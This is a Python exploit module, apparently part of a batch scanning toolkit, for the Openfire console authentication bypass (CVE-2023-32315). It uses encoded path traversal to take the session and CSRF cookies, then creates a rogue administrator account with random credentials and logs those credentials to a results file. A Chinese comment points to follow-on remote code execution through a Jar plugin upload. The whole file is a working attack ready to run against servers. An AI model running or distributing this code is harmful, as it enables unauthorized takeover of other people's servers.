#!/user/bin/env python3
# -*- coding: utf-8 -*-
# Author: Pari Malam

import random
import string
from pub.com.reqset import ReqSet
import HackRequests
from pub.com.outprint import OutPrintInfoSuc
from colorama import Fore, init

class Cve_2023_32315:
    def banners(self):
        artwork = f'''{self.FR}

         ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
        ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
        ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
        ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
        ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
         ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝

        Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
        Use at your own risk!
        '''
        return print(artwork)


    def generate_random_string(self,length):
        charset = string.ascii_lowercase + string.digits
        return ''.join(random.choice(charset) for _ in range(length))


    def between(self,string, starting, ending):
        s = string.find(starting)
        if s < 0:
            return ""
        s += len(starting)
        e = string[s:].find(ending)
        if e < 0:
            return ""
        return string[s: s + e]



    def exploit(self,target):
        hack = HackRequests.hackRequests()
        host = target.split("://")[1]

        jsessionid = ""
        csrf = ""

        try:
            url = f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"
            # log_url = f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
            # plugin_url = f"{target}/setup/setup-/../../plugin-admin.jsp?update=true&restart=true"

            headers = {
                "User-Agent": self.header,
                "Accept-Encoding": "gzip, deflate",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "close",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "DNT": "1",
                "X-Forwarded-For": "1.3.3.7",
                "Upgrade-Insecure-Requests": "1"
            }
            if not self.batch:
                print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FG}Checking in current... Please be patient!")

            r = hack.http(url, headers=headers)
            jsessionid = r.cookies.get('JSESSIONID', '')
            csrf = r.cookies.get('csrf', '')

            if jsessionid != "" and csrf != "":
                if not self.batch:
                    print(
                        f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FG}[w00t!] {self.FY}JSESSIONID: {self.FW}{jsessionid} {self.FY}CSRF: {self.FW}{csrf}")
            else:
                if not self.batch:
                    print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FR}[Failed] Cannot obatained jsessionid and csrf")
                return

            u = self.generate_random_string(6)
            p = self.generate_random_string(6)

            headerss = {
                "Host": host,
                "User-Agent": self.header,
                "Accept-Encoding": "gzip, deflate",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "close",
                "Cookie": f"JSESSIONID={jsessionid}; csrf={csrf}",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "DNT": "1",
                "X-Forwarded-For": "1.3.3.7",
                "Upgrade-Insecure-Requests": "1"
            }

            create_user = f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={u}&name=&email=&password={p}&passwordConfirm={p}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
            r = hack.http(create_user, headers=headerss,proxy=self.proxy)

            if r.status_code == 200:
                if not self.batch:
                    print(
                        f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FG}[w00t!] Successful with no problemo!\n{self.FY}[+] URLs: {target}\nUsername: {u}\nPassword: {p}")
                    print(f"{self.FY}后续可以通过上传Jar包进行RCE利用")
                else:
                    OutPrintInfoSuc("Openfire",f"存在漏洞 {target}---User: {u}---Pass: {p}")
                    with open("./results/openfire_2023_32315.txt", "a+") as f:
                            f.write(
                                f"URLs: {target}---Username: {u}---Password: {p}\n")
            else:
                if not self.batch:
                    print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FR}[Failed!]")

        except Exception as e:
            if not self.batch:
                print(f"{self.FY}[CVE-2023–32315] - {self.FW}{target} - {self.FR}[Failed!] - Error occurred while retrieving cookies")


    def main(self,target):
        self.batch = target["batch_work"]
        init(autoreset=True)
        self.FY = Fore.YELLOW
        self.FG = Fore.GREEN
        self.FR = Fore.RED
        self.FW = Fore.WHITE
        self.FC = Fore.CYAN
        url = target["url"].strip('/ ')
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            self.banners()
        self.exploit(url)
